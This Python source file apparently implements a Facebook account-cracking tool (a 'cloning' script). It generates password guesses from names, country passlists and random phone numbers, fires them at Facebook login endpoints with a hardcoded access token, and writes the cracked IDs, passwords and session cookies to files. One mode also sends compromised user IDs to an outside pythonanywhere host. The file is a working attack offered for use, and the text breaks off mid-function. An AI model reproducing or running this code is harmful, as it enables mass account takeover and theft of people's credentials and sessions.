"""
---> WRITTEN BY SABBIR〤IMRAN <---
--->          600 MEMBER SABBIR          <---
---> CREATE TIME: 1 APRIL 2025  <---
---> LAST UPDATE: 5 APRIL 2025  <---
"""
#-_-_-_-_-_-_-_-<-MODULE->-_-_-_-_-_-_-_-#
import os,random,time,string,sys,uuid,json
from pip._vendor import requests
from os import system
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-_-_-_-_-_-_-_-<-INSTALL->-_-_-_-_-_-_-_-#
system("pkg uninstall python -y;pkg install python-pip -y;pip uninstall pycurl requests chardet urllib3 idna certifi -y > /dev/null;pip install pycurl chardet urllib3 idna certifi requests > /dev/null")
system('clear')
#-_-_-_-_-_-_-_-<-COLOR->-_-_-_-_-_-_-_-#
G="\033[1;92m"
W="\x1b[38;5;15m"
B="\033[1;34m"
Y="\x1b[38;5;226m"
A="\x1b[38;5;123m"
R="\33[1;91m"
O="\x1b[38;5;81m"
X="\x1b[38;5;205m"
P="\x1b[10;95m"
#-_-_-_-_-_-_-_-<-STYLE->-_-_-_-_-_-_-_-#
vb = f"{W}>{G}×{W}<"
vb1 = f"{W}>{G}1{W}<"
vb2 = f"{W}>{G}2{W}<"
vb3 = f"{W}>{G}3{W}<"
vb0 = f"{W}>{G}0{W}<"
vbv = f"{W}>{G}?{W}<"
vcv = f"{W}>{G}>{W}>"
#-_-_-_-_-_-_-_-<-CLEAR->-_-_-_-_-_-_-_-#
def clear():
	system("clear")
	print(logo)
#-_-_-_-_-_-_-_-<-LINE->-_-_-_-_-_-_-_-#
def linex():
	print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-_-_-_-_-_-_-_-<-SIM-CODE->-_-_-_-_-_-_-_-#
_C_o_D_e_ = f"{vb} EXAMPLE   {vcv} 0161 {G}/{W} 0171{G}/{W} 0181 {G}/{W} 0199"
#-_-_-_-_-_-_-_-<-LIMIT->-_-_-_-_-_-_-_-#
_L_i_M_i_T_= f"{vb} EXAMPLE   {vcv} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999"
#-_-_-_-_-_-_-_-<-METHOD->-_-_-_-_-_-_-_-#
_M_e_T_h_O_d_ = f"{vb1} METHOD {W}/{G}1-HOST{W}/\n{vb2} METHOD {W}/{G}2-MBASIC{W}/"
_M_e_T_h_O_dd_ = f"{vb1} METHOD {W}/{G}1-HOST{W}/\n{vb2} METHOD {W}/{G}2-MBASIC{W}/"
#-_-_-_-_-_-_-_-<-LOGO->-_-_-_-_-_-_-_-#
logo = (f"""
      
  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$ 
 /$$__  $$ /$$__  $$| $$__  $$| $$__  $$|_  $$_/| $$__  $$
| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$  | $$  | $$  \ $$
|  $$$$$$ | $$$$$$$$| $$$$$$$ | $$$$$$$   | $$  | $$$$$$$/
 \____  $$| $$__  $$| $$__  $$| $$__  $$  | $$  | $$__  $$
 /$$  \ $$| $$  | $$| $$  \ $$| $$  \ $$  | $$  | $$  \ $$
|  $$$$$$/| $$  | $$| $$$$$$$/| $$$$$$$/ /$$$$$$| $$  | $$
 \______/ |__/  |__/|_______/ |_______/ |______/|__/  |__ 
 VERTION 0.1
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{vb} DEVELOPER {vcv}SABBIR{G}-{W}
{vb} FEATURES  {vcv} RANDOM{G}〤{W}FILE{G}〤{W}OLD
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#-_-_-_-_-_-_-_-<-SELF->-_-_-_-_-_-_-_-#
class _G_i_F_t_:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
        self.plist = []
#-_-_-_-_-_-_-_-<-MAIN-MENU->-_-_-_-_-_-_-_-#
    def _M_e_N_u_(self):
    	clear()
    	print(f"{vb1} RANDOM CLONING  | {vb3} OLD CLONING")
    	print(f"{vb2} FILE CLONING    | {vb0} EXIT TOOLS ")
    	linex()
    	_m_E_n_U_ = input(f"{vbv} INPUT MENU {vcv} ")
    	if _m_E_n_U_ == "1":
    	    self._R_a_N_d_O_m_()
    	if _m_E_n_U_ == "2":
    	    self._F_i_L_e_()
    	if _m_E_n_U_ == "3":
    	    self._O_i_D_()
    	if _m_E_n_U_ == "0":
    	    linex()
    	    print(f"{vb} SUCCESSFULLY EXIT DONE.....!")
    	if _m_E_n_U_ not in ["1","2","3","0"]:
        	linex()
        	print(f"{vb} INVALID OPTION TRY AGAIN......!")
        	time.sleep(1.5)
        	self._M_e_N_u_()
#-_-_-_-_-_-_-_-<-FILE-MENU->-_-_-_-_-_-_-_-#
    def _F_i_L_e_(self):
    	clear()
    	print(f"{vb} EXAMPLE   {vcv}{G} /{W}sdcard{G}/{W}SABBIR{G}.{W}txt ")
    	linex()
    	_F_i_L_e_C_ = input(f"{vbv} INPUT FILE PATH {vcv} ")
    	try:
    	    _F_i_L_e_K_ = open(_F_i_L_e_C_,'r').read().splitlines()
    	except FileNotFoundError:
    	    linex()
    	    print(f"{vb} FILE NOT FOUND TRY AGAIN......!")
    	    time.sleep(1.5)
    	    self._F_i_L_e_()
    	clear()
    	print(_M_e_T_h_O_d_)
    	linex()
    	_f_I_l_e_M_e_T_h_O_d_ = input(f"{vbv} INPUT METHOD {vcv} ")
    	clear()
    	print(f"{vb1} AUTO BANGLADESH PASSLIST ")
    	print(f"{vb2} AUTO INDIA PASSLIST ")
    	print(f"{vb3} CUSTOM PASSLIST ")
    	linex()
    	_P_a_S_ = input(f"{vbv} INPUT PASSLIST {vcv} ")
    	if _P_a_S_ == "1":
    	    self.plist.append("first12")
    	    self.plist.append("first123")
    	    self.plist.append("first1234")
    	    self.plist.append("000999")
    	    self.plist.append("firstlast123")
    	    self.plist.append("firstlast12")
    	    self.plist.append("first321")
    	    self.plist.append("firstlast")
    	    self.plist.append("first@123")
    	    self.plist.append("firstlast1234")
    	    self.plist.append("first@12")
    	    self.plist.append("258000")
    	    self.plist.append("0987654")
    	    self.plist.append("@1234@")
    	    self.plist.append("09876543")
    	    self.plist.append("@@@@####")
    	    self.plist.append("@@@###")
    	    self.plist.append("@123456@")
    	    self.plist.append("@12345678@")
    	    self.plist.append("112233")
    	if _P_a_S_ == "2":
    	    self.plist.append('57273200')
    	    self.plist.append('59039200')
    	    self.plist.append('57575751')
    	    self.plist.append('07860786')
    	if _P_a_S_ not in ["1","2"]:
    	    try:
    	        clear()
    	        print(f"{vb} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
    	        print(f"{vb} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
    	        linex()
    	        _P_a_S_l_i_ = int(input(f"{vbv} PASSWORD LIMIT {vcv} "))
    	    except:
    	        _P_a_S_l_i_ = 5
    	    clear()
    	    print(f"{vb} EXAMPLE   {vcv} firstlast {G}/{W} first12 {G}/{W} first123 ")
    	    linex()
    	    for i in range(_P_a_S_l_i_):
    	        self.plist.append(input(f"{vb} ENTER PASSLIST {G}/{W}{i+1}{G}/ {vcv} "))
    	with ThreadPool(max_workers=30) as __FI__:
    	    clear()
    	    total_ids = str(len(_F_i_L_e_K_))
    	    print(f"{vb} TOTAL IDS {vcv} {total_ids} ")
    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
    	    linex()
    	    for user in _F_i_L_e_K_:
    	        ids,names = user.split('|')
    	        passlist = self.plist
    	        if _f_I_l_e_M_e_T_h_O_d_ == "1":
    	            __FI__.submit(self._M_1_X_,ids,names,passlist)
    	        if _f_I_l_e_M_e_T_h_O_d_ == "2":
    	            __FI__.submit(self._M_2_X_,ids,names,passlist)
    	        if _f_I_l_e_M_e_T_h_O_d_ not in ["1","2"]:
    	            __FI__.submit(self._M_1_X_,ids,names,passlist)
    	print("\033[1;37m")
    	linex()
    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR USING.....! ")
#-_-_-_-_-_-_-_-<-FILE-M1->-_-_-_-_-_-_-_-#
    def _M_1_X_(self,ids,names,passlist):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-F1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    except:
                ln = fn
    	    for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': family,
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': accessToken,
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': advertiser_id,
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.1000001430511475',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"POCO M2 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
    'viewport-width': '980',
}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    ids = str(po['uid'])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{vb}{G}/{W}>{B}SABBIR-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/SABBIR-BY-SABBIR-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/SABBIR-BY-SABBIR-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-FILE-M2->-_-_-_-_-_-_-_-#
    def _M_2_X_(self,ids,names,passlist):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-F2{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    except:
                ln = fn
    	    for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data={
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email':ids,
                'password':pas,
                'access_token':accessToken,
                'generate_session_cookies':'1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.1000001430511475',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"POCO M2 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
    'viewport-width': '980',
}
                url = 'https://api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    ids = str(po['uid'])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{vb}{G}/{W}>{B}SABBIR-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/SABBIR-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/SABBIR-BY-SABBIR-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-RANDOM-MENU->-_-_-_-_-_-_-_-#
    def _R_a_N_d_O_m_(self):
    	clear()
    	print(_C_o_D_e_)
    	linex()
    	_r_A_n_S_i_M_ = input(f"{vbv} INPUT SIM CODE {vcv} ")
    	clear()
    	print(_L_i_M_i_T_)
    	linex()
    	_r_A_n_L_i_M_i_T_ = int(input(f"{vbv} INPUT LIMIT {vcv} "))
    	clear()
    	print(_M_e_T_h_O_dd_)
    	linex()
    	_r_A_n_M_e_T_h_O_d_ = input(f"{vbv} INPUT METHOD {vcv} ")
    	for x in range(_r_A_n_L_i_M_i_T_):
        	nmp = ''.join(random.choice(string.digits) for _ in range(8))
        	self.gen.append(nmp)
    	with ThreadPool(max_workers=30) as __RA__:
    	    clear()
    	    print(f"{vb} SIM CODE  {vcv} {_r_A_n_S_i_M_} ")
    	    print(f"{vb} TOTAL IDS {vcv} {_r_A_n_L_i_M_i_T_} ")
    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
    	    linex()
    	    for love in self.gen:
    	        ids = _r_A_n_S_i_M_ + love
    	        passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:]]
    	        if _r_A_n_M_e_T_h_O_d_ == "1":
    	            __RA__.submit(self._M_1_,ids,passlist)
    	        if _r_A_n_M_e_T_h_O_d_ == "2":
    	            __RA__.submit(self._M_2_,ids,passlist)
    	        if _r_A_n_M_e_T_h_O_d_ not in ["1","2"]:
    	            __RA__.submit(self._M_1_,ids,passlist)
    	print("\033[1;37m")
    	linex()
    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR USING.....! ")
#-_-_-_-_-_-_-_-<-RANDOM-M1->-_-_-_-_-_-_-_-#
    def _M_1_(self,ids,passlist):
    	global loop,oks,cps
    	coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-R1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':accessToken,}
                headers = {
    'authority': 'x.facebook.com',
    'method':'GET',
    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.1000001430511475',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"POCO M2 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = po['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}SABBIR-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/SABBIR-BY-SABBIR-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/SABBIR-BY-SABBIR-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-RANDOM-M2->-_-_-_-_-_-_-_-#
    def _M_2_(self,ids,passlist):
    	global loop,oks,cps
    	coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-R2{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_GB',
                'client_country_code':'GB',
                'fb_api_req_friendly_name':'authenticate'}
                headers = {
    'authority': 'x.facebook.com',
    'method':'GET',
    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.1000001430511475',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"POCO M2 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                url = 'https://b-graph.facebook.com/auth/login'
